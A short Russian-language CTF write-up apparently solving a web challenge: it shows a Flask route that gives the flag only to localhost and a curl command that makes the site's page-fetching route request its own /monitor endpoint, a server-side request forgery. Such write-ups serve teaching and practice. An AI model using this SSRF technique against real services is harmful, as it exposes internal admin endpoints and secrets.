Получение флага

В зипе нас интересует только файл app.py.
Это приложение на Flask со следующими маршрутами:

  1. /: Главная страница, которая загружает и отображает содержимое указанного сайта.
  2. /monitor: Маршрут для просмотра флага, доступный только с локального хоста

В маршруте /monitor проверяется IP-адрес запроса.

if request.remote_addr in ("localhost", "127.0.0.1"):
    return render_template("admin.html", message=flag, errors="".join(log) or "No recent errors")
else:
    return render_template("admin.html", message="Unauthorized access", errors="")

Создаем запрос и пытаемся получить флаг.

curl "https://reader.tjc.tf/?site=http://127.0.0.1:5000/monitor"
